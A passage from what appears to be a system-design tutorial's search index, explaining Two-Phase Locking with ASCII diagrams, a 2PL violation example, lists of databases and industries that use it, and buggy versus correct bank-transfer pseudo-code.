\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u2705 SERIALIZABILITY                                   \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 All transactions following 2PL       \u2502            \u2502\n\u2502    \u2502 produce results equivalent to some   \u2502            \u2502\n\u2502    \u2502 serial execution order               \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 Concurrent execution = Serial order  \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2705 CONFLICT SERIALIZABILITY                          \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 No dirty reads, no lost updates,     \u2502            \u2502\n\u2502    \u2502 no inconsistent reads                \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 Conflicts resolved by lock ordering  \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u26a0\ufe0f  CASCADING ABORTS POSSIBLE                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 If T1 aborts, transactions that read \u2502            \u2502\n\u2502    \u2502 T1's uncommitted data must also abort\u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 (Solved by Strict 2PL - see below)   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Violation Example (What NOT to do):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        INVALID - 2PL VIOLATION                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Time  Action                    Phase      Locks Held   \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n\u2502 t1    BEGIN                     -          []           \u2502\n\u2502 t2    Lock(A)                   GROWING    [A]          \u2502\n\u2502 t3    Lock(B)                   GROWING    [A, B]       \u2502\n\u2502 t4    READ A, READ B            GROWING    [A, B]       \u2502\n\u2502 t5    Unlock(A) \u274c              SHRINKING  [B]          \u2502\n\u2502       (Shrinking phase started!)                        \u2502\n\u2502 t6    Lock(C) \u274c\u274c\u274c             SHRINKING  -            \u2502\n\u2502       \u2191 VIOLATION! Cannot acquire lock                  \u2502\n\u2502         after releasing any lock!                       \u2502\n\u2502                                                         \u2502\n\u2502 This violates 2PL protocol!                             \u2502\n\u2502 Serializability NOT guaranteed!                         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#452-where-is-2pl-used","title":"4.5.2 Where is 2PL Used?","text":"<p>Description:</p> <p>Two-Phase Locking isn't just an academic concept - it's the workhorse protocol powering mission-critical systems worldwide, processing billions of transactions daily. From Wall Street trading systems executing millions of stock trades per second, to airline reservation systems booking flights for millions of passengers, to e-commerce platforms handling Black Friday shopping surges, 2PL is the invisible guardian ensuring data consistency.</p> <p>The widespread adoption of 2PL across virtually all major database systems isn't coincidental - it reflects the protocol's proven track record of reliability, correctness, and performance in production environments. When companies like banks, hospitals, and government agencies choose database systems, they're implicitly choosing 2PL because it's been battle-tested for nearly five decades.</p> <p>Why 2PL Dominates Production Systems:</p> <ol> <li> <p>Correctness Guarantee: Unlike application-level locking (prone to human error), 2PL is enforced automatically by the database engine. Developers can't accidentally break serializability.</p> </li> <li> <p>Transparent to Applications: Developers write <code>BEGIN...COMMIT</code> blocks, and 2PL handles all the complex lock acquisition/release logic automatically. No manual lock management needed.</p> </li> <li> <p>Vendor Support: All major database vendors provide enterprise support, monitoring tools, and optimization features specifically for 2PL-based systems.</p> </li> <li> <p>Ecosystem Maturity: Decades of tooling, debugging utilities, performance analyzers, and best practices documentation exist for 2PL.</p> </li> </ol> <p>Real-World Database Systems:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         2PL USAGE IN DATABASE SYSTEMS                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. TRADITIONAL RELATIONAL DATABASES                     \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 MySQL/InnoDB (Strict 2PL)          \u2502            \u2502\n\u2502    \u2502 \u2022 PostgreSQL (Strict 2PL)            \u2502            \u2502\n\u2502    \u2502 \u2022 Oracle Database (Strict 2PL)       \u2502            \u2502\n\u2502    \u2502 \u2022 SQL Server (Strict 2PL)            \u2502            \u2502\n\u2502    \u2502 \u2022 DB2 (Strict 2PL)                   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. TRANSACTION PROCESSING SYSTEMS                       \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Banking systems (account transfers) \u2502            \u2502\n\u2502    \u2502 \u2022 E-commerce (order processing)      \u2502            \u2502\n\u2502    \u2502 \u2022 Airline reservation systems        \u2502            \u2502\n\u2502    \u2502 \u2022 Stock trading platforms            \u2502            \u2502\n\u2502    \u2502 \u2022 Payment gateways                   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. EMBEDDED DATABASES                                   \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 SQLite (2PL variant)               \u2502            \u2502\n\u2502    \u2502 \u2022 Berkeley DB                        \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. IN-MEMORY DATABASES                                  \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Redis (transaction blocks)         \u2502            \u2502\n\u2502    \u2502 \u2022 Memcached (with extensions)        \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. DISTRIBUTED DATABASES (with adaptations)             \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Google Spanner (2PL + timestamps)  \u2502            \u2502\n\u2502    \u2502 \u2022 CockroachDB (Serializable SI)      \u2502            \u2502\n\u2502    \u2502 \u2022 YugabyteDB                         \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Use Cases by Industry:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         2PL USE CASES BY INDUSTRY                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 \ud83c\udfe6 BANKING &amp; FINANCE                                    \u2502\n\u2502    \u2022 Money transfers between accounts                   \u2502\n\u2502    \u2022 Loan processing                                    \u2502\n\u2502    \u2022 Credit/debit card transactions                     \u2502\n\u2502    \u2022 ATM withdrawals                                    \u2502\n\u2502    \u2192 Need: Strong consistency, no lost updates          \u2502\n\u2502                                                         \u2502\n\u2502 \ud83d\uded2 E-COMMERCE                                           \u2502\n\u2502    \u2022 Inventory management (prevent overselling)         \u2502\n\u2502    \u2022 Order placement                                    \u2502\n\u2502    \u2022 Shopping cart checkout                             \u2502\n\u2502    \u2022 Payment processing                                 \u2502\n\u2502    \u2192 Need: Prevent race conditions on stock             \u2502\n\u2502                                                         \u2502\n\u2502 \u2708\ufe0f  AIRLINE/HOTEL RESERVATIONS                          \u2502\n\u2502    \u2022 Seat/room booking                                  \u2502\n\u2502    \u2022 Cancellations and refunds                          \u2502\n\u2502    \u2022 Overbooking management                             \u2502\n\u2502    \u2192 Need: Prevent double-booking                       \u2502\n\u2502                                                         \u2502\n\u2502 \ud83c\udfe5 HEALTHCARE                                           \u2502\n\u2502    \u2022 Patient record updates                             \u2502\n\u2502    \u2022 Prescription management                            \u2502\n\u2502    \u2022 Appointment scheduling                             \u2502\n\u2502    \u2192 Need: Data integrity, audit trails                 \u2502\n\u2502                                                         \u2502\n\u2502 \ud83d\udcca ENTERPRISE APPLICATIONS                              \u2502\n\u2502    \u2022 ERP systems (inventory, HR, finance)               \u2502\n\u2502    \u2022 CRM systems (customer data)                        \u2502\n\u2502    \u2022 Accounting software                                \u2502\n\u2502    \u2192 Need: Consistent business logic                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#453-how-2pl-is-useful-to-pessimistic-concurrency-control","title":"4.5.3 How 2PL is Useful to Pessimistic Concurrency Control","text":"<p>Description:</p> <p>Pessimistic concurrency control without 2PL is like having a lock on your front door but no rules about when to use it - theoretically secure, but practically chaotic. While pessimistic locking provides the mechanism (locks), Two-Phase Locking provides the discipline (protocol) that makes those locks actually work correctly.</p> <p>The Fundamental Problem:</p> <p>Imagine a scenario where transactions can lock and unlock resources arbitrarily: <pre><code>T1: Lock(A) \u2192 Read(A) \u2192 Unlock(A) \u2192 Lock(B) \u2192 Read(B) \u2192 Write(C)\nT2: Lock(B) \u2192 Read(B) \u2192 Unlock(B) \u2192 Lock(A) \u2192 Read(A) \u2192 Write(C)\n</code></pre></p> <p>Even though both transactions use locks, they can still produce non-serializable results: - T1 releases A before locking B - T2 can now modify A (after T1 read it but before T1 completes) - T1's computation of C is based on stale data - Result: Lost update or inconsistent state</p> <p>This is called an inconsistent analysis problem - the transaction analyzes data that changes mid-transaction, leading to incorrect results.</p> <p>2PL as the Solution:</p> <p>2PL transforms pessimistic locking from a set of independent lock operations into a coherent protocol that guarantees correctness. It's the difference between: - Without 2PL: \"I have locks, so I'm probably safe\" (hope-based concurrency) - With 2PL: \"I follow the protocol, so I'm provably safe\" (science-based concurrency)</p> <p>Historical Perspective:</p> <p>In the early days of databases (1960s-1970s), developers manually managed locks in application code. This led to: - Frequent bugs: Developers forgot to acquire locks, released them too early, or acquired them in wrong order - Non-portable code: Lock logic tied to specific applications, hard to reuse - No guarantees: No way to prove transactions would produce correct results</p> <p>The introduction of 2PL moved locking from an ad-hoc application concern to a systematic database feature. This was as revolutionary as moving from manual memory management to garbage collection - it eliminated a whole class of bugs.</p> <p>Real-World Impact:</p> <p>Consider a banking system processing account transfers:</p> <p>Without 2PL (ad-hoc locking): <pre><code># Bug-prone manual locking\ndef transfer(from_acc, to_acc, amount):\n    lock(from_acc)           # Lock first account\n    balance = read(from_acc)\n    unlock(from_acc)         # \u26a0\ufe0f Released too early!\n\n    lock(to_acc)            # Another transaction can modify from_acc now!\n    write(from_acc, balance - amount)  # May overdraw!\n    write(to_acc, read(to_acc) + amount)\n    unlock(to_acc)\n</code></pre></p> <p>With 2PL (enforced by database): <pre><code># Safe and correct\ndef transfer(from_acc, to_acc, amount):\n    BEGIN TRANSACTION  # Database automatically manages locks per 2PL\n    balance = SELECT balance FROM accounts WHERE id=from_acc FOR UPDATE\n    # Lock held automatically by 2PL protocol\n    UPDATE accounts SET balance = balance - amount WHERE id = from_acc\n    UPDATE accounts SET balance = balance + amount WHERE id = to_acc\n    COMMIT  # Locks released only now, following 2PL\n</code></pre></p> <p>The second version is not only safer but simpler - developers don't think about lock management at all.</p> <p>Why This Matters for System Design:</p> <p>When designing distributed systems or microservices, understanding 2PL helps you: 1. Recognize when you need it: Multi-step operations on shared data 2. Know its limitations: Network partitions can break 2PL assumptions 3. Choose alternatives wisely: When to use optimistic control or distributed consensus (Paxos, Raft) 4. Appreciate database guarantees: Why ACID databases can make certain guarantees that NoSQL can't</p> <p>Key Benefits of 2PL for Pessimistic Control:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    HOW 2PL HELPS PESSIMISTIC CONCURRENCY CONTROL        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u2705 GUARANTEES SERIALIZABILITY                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Problem without 2PL:                 \u2502            \u2502\n\u2502    \u2502 Pessimistic locking alone doesn't    \u2502            \u2502\n\u2502    \u2502 guarantee serializability            \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 Solution with 2PL:                   \u2502            \u2502\n\u2502    \u2502 Two-phase discipline ensures results \u2502            \u2502\n\u2502    \u2502 are equivalent to serial execution   \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 Example:                             \u2502            \u2502\n\u2502    \u2502 Without 2PL: T1 and T2 might produce \u2502            \u2502\n\u2502    \u2502              non-serializable result \u2502            \u2502\n\u2502    \u2502 With 2PL:    Results always match    \u2502            \u2502\n\u2502    \u2502              some serial order       \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2705 PREVENTS LOST UPDATES                             \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Scenario: Two transactions updating  \u2502            \u2502\n\u2502    \u2502           same account balance       \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 T1: balance = 1000 \u2192 1500 (+500)     \u2502            \u2502\n\u2502    \u2502 T2: balance = 1000 \u2192 1200 (+200)     \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 WITHOUT 2PL (wrong):                 \u2502            \u2502\n\u2502    \u2502 \u2022 Both read 1000                     \u2502            \u2502\n\u2502    \u2502 \u2022 T1 writes 1500                     \u2502            \u2502\n\u2502    \u2502 \u2022 T2 writes 1200 (overwrites T1!)    \u2502            \u2502\n\u2502    \u2502 \u2022 Result: 1200 \u274c (lost $500!)       \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 WITH 2PL (correct):                  \u2502            \u2502\n\u2502    \u2502 \u2022 T1 locks, reads 1000, writes 1500  \u2502            \u2502\n\u2502    \u2502 \u2022 T2 waits for T1's lock              \u2502            \u2502\n\u2502    \u2502 \u2022 T1 commits, releases lock          \u2502            \u2502\n\u2502    \u2502 \u2022 T2 locks, reads 1500, writes 1700  \u2502            \u2502\n\u2502    \u2502 \u2022 Result: 1700 \u2713 (both applied!)     \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u2705 PREVENTS NON-REPEATABLE READS                     \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Problem: Reading same data twice     \u2502            \u2502\n\u2502    \u2502          within transaction gives    \u2502            \u2502\n\u2502    \u2502          different results           \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 WITHOUT 2PL:                         \u2502            \u2502\n\u2502    \u2502 T1: Read A (100)                     \u2502            \u2502\n\u2502    \u2502 T2: Update A to 200, commit          \u2502            \u2502\n\u2502    \u2502 T1: Read A (200) \u2190 Different! \u274c     \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 WITH 2PL:                            \u2502            \u2502\n\u2502    \u2502 T1: Lock + Read A (100)              \u2502            \u2502\n\u2502    \u2502 T2: Tries to update \u2192 WAITS          \u2502            \u2502\n\u2502    \u2502 T1: Read A (100) \u2190 Same! \u2713           \u2502            \u2502\n\u2502    \u2502 T1: Commit, release lock             \u2502            \u2502\n\u2502    \u2502 T2: Now can update                   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u2705 PROVIDES ISOLATION                                \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 2PL enforces transaction isolation:  \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 \u2022 Transactions don't interfere       \u2502            \u2502\n\u2502    \u2502 \u2022 Intermediate states not visible    \u2502            \u2502\n\u2502    \u2502 \u2022 Clean separation of work           \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 Isolation Level Mapping:             \u2502            \u2502\n\u2502    \u2502 Strict 2PL \u2192 SERIALIZABLE            \u2502            \u2502\n\u2502    \u2502 Standard 2PL \u2192 REPEATABLE READ       \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. \u2705 STRUCTURED LOCK MANAGEMENT                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 2PL provides clear rules:            \u2502            \u2502\n\u2502    \u2502                                      \u2502            